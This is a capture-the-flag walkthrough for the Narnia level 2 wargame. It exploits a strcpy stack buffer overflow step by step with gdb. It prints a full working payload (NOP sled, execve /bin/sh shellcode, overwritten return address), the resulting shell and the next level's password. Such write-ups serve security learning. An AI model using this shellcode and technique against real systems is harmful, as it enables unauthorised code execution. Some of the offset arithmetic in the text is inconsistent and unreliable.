--------------
*This one is going to be tricky so take a deep breath and follow me*

Here is our code!

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}

```


So first i want to try a basic overflow, let's create a 128char length strìng w/ bash, Let's just run this:
```bash
for i in {1..128}; do a+="a";done;echo $a
```
and then we input into ./narnia2 by just tapping ./narnia2 $a
Everything seems to work as usual
now I replace 128 by 140 and get a segmentation fault


###   For now everything seems to be pretty 'logic'
As long as our input is inferior as the Buffer Size everything works fine but once we've break it **BOOM**
But our objective is to take control of the last bye without this segmentation fault to incrust a shell code!

##       How can I do that?
We can try to run this function in debug mod to understand what's happening after the 128 bytes
so let's see with gdb ./narnia2
Once you're in let's disassemble with `disas main`
Here is our ouput:
```
   0x0804844b <+0>:     push   %ebp
   0x0804844c <+1>:     mov    %esp,%ebp
   0x0804844e <+3>:     add    $0xffffff80,%esp
   0x08048451 <+6>:     cmpl   $0x1,0x8(%ebp)
   0x08048455 <+10>:    jne    0x8048471 <main+38>
   0x08048457 <+12>:    mov    0xc(%ebp),%eax
   0x0804845a <+15>:    mov    (%eax),%eax
   0x0804845c <+17>:    push   %eax
   0x0804845d <+18>:    push   $0x8048520
   0x08048462 <+23>:    call   0x8048300 <printf@plt>
   0x08048467 <+28>:    add    $0x8,%esp
   0x0804846a <+31>:    push   $0x1
   0x0804846c <+33>:    call   0x8048320 <exit@plt>
   0x08048471 <+38>:    mov    0xc(%ebp),%eax
   0x08048474 <+41>:    add    $0x4,%eax
   0x08048477 <+44>:    mov    (%eax),%eax
   0x08048479 <+46>:    push   %eax
   0x0804847a <+47>:    lea    -0x80(%ebp),%eax
   0x0804847d <+50>:    push   %eax
   0x0804847e <+51>:    call   0x8048310 <strcpy@plt>
   0x08048483 <+56>:    add    $0x8,%esp
   0x08048486 <+59>:    lea    -0x80(%ebp),%eax
   0x08048489 <+62>:    push   %eax
   0x0804848a <+63>:    push   $0x8048534
   0x0804848f <+68>:    call   0x8048300 <printf@plt>
   0x08048494 <+73>:    add    $0x8,%esp
   0x08048497 <+76>:    mov    $0x0,%eax
   0x0804849c <+81>:    leave  
   0x0804849d <+82>:    ret
```  
>How to understand this table:
>The number on the left are the memory space allocated to each action we make with our app
>The words in the middle are the different action made to the stack
>And don't try to understand the Right part bc we don't need it now!

Our main objective now is to take control of the "seg Fault" part, so let's replace the "leave" by a break we initiate
I copied the leave Hex and then run `break *0x0804849c`
So on i created a break point where i can see what's happening at a time T

Let's run our program (still in the dbg) by using `run $a`, but my $a is not into my gdb ($a is a variable dedicated to bash, but now i'm using a different app who don't share variables with my bash) so let's just run a python or perl to inject lots of char, i choosed python(i use more python than perl so it's easier to me)
Let's run the following command into our gdb:

run `python -c 'print "A"*140'`

And then it tell us we have a breakpoint on main  --> perfect
So now let's see if we can input 4hex at the end of that string, let's use deadbeef as a test
(deadbeef is like the cool hex for pentesting bc you can read it directly in hex)
so my code will look like this --> run `python -c 'print "A"*150 + "\xef\xbe\xad\xde"'`
Now we have to found were the breakpoint is (how many A before i can see my deadbeef)
(press c for continuating the program after our break point!)
Basically, on the last Narnia, the buffer overflow was totally given to me so it was quite easy for me but now I need to find this breakpoint by my own
Normally you do have Injecter that find this buff overflow by it's own but for the game let's just do it by hand
So I move on pretty quickly and I saw that at 132A i can see my dead beef appear!


##         Now it's time for some theory isn't it?
What is ESP and EBP??
ESP is the current stack pointer. --> Which stack are we pointing at?
EBP is the base pointer for the current stack frame. --> Which part of this stack are we pointing at?
Pretty easy to understand when you have basic pointer knowledge, but now we need to use them to find how we will inject our shellcode ( I said that we were going to reuse it!)

We now have to sent him a request, taking care of the 132 char and by the way forcing the CPU to exec our beautiful shellcode.
We're going to use a NOP sled (our slide/ramp, ayw) --> *(you've to know that, now most of the protocol detects NOp sled and so it's a pretty rare technique in our time)*
This NÖP basically just switch the information to the next hex, like a virtual slide!

NOP sled is caracterised by the char \x90
Our shellcode is 25bytes long, so we need 
132 - 25 = 107 nop sled to sliiide onto all the first data, our shell code, and our dead beef to close up the march
So we have a fatty code but the computer will only understand that he has to skip this code x107 times and THEN when he finally find stg to do **BOOM** that's our exploit!
so let's type this command in the dbg:
run `python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xef\xbe\xad\xde"'`

###      Let's exploit it Timmy
But putting our deadbeef has a sens as long as we're just testing! Now it's time for action!
ALRIGHT, now we need to see which address is going to replace our deadbeef! 
So let's have a look to the stack and see which parts are fulfilled by our \x90 and pick one of them
If they are overwritten let's considere them as free and use this adress!
Here is the stack: (*on the left=adress of the byte, and just after the four bit of this byte*)

```
----------------------------------cutted----------------------------------
0xffffd7d0:     0xffffd7fb      0x00000000      0x00000000      0x00000000
0xffffd7e0:     0x00000000      0x00000000      0x4f000000      0xb63dffa5
0xffffd7f0:     0xf0e77704      0x03265561      0x6960a8df      0x00363836
0xffffd800:     0x00000000      0x72616e2f      0x2f61696e      0x6e72616e
0xffffd810:     0x00326169      0x90909090      0x90909090      0x90909090
0xffffd820:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd830:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd840:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd850:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd860:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd870:     0x90909090      0x90909090      0x90909090      0x31909090
0xffffd880:     0x2f6850c0      0x6868732f      0x6e69622f      0x5350e389
0xffffd890:     0xc289e189      0x80cd0bb0      0xdeadbeef      0x5f434c00
0xffffd8a0:     0x3d4c4c41      0x555f6e65      0x54552e53      0x00382d46
0xffffd8b0:     0x435f534c      0x524f4c4f      0x73723d53      0x643a303d
----------------------------------cutted----------------------------------
```

Let's have a closer look and find adresses overwritten by \x90
I cutted the stack to the part we're interested in!
We see that from 0xffffd820 to 0xffffd870, they are all fulfilled by 9090909 so let's grab one of this line
0xffffd860 in my case ! Don't forget to convert to a little endian
>Quick reminder Big and Little Endian switch the reading order, so read it in reverse --> like so \x60\xd8\xff\xff

So let's replace our deadbeef by this brand new adresses and we're fine!
run `python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd8\xff\xff"'`

after running it we saw this: process 15647 is executing new program: /bin/dash
PERFECT!!!! SO OUR EXPLOIT WORKS

Pretty standart but it does works! let's test it out of the dbg

./narnia2 `python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd8\xff\xff"'`

And we do have a new shell!!! Let's just cat the next password

$ cat /etc/narnia_pass/narnia3
vaequeezee

IT DOES WORK perfect !! let's move on to the next level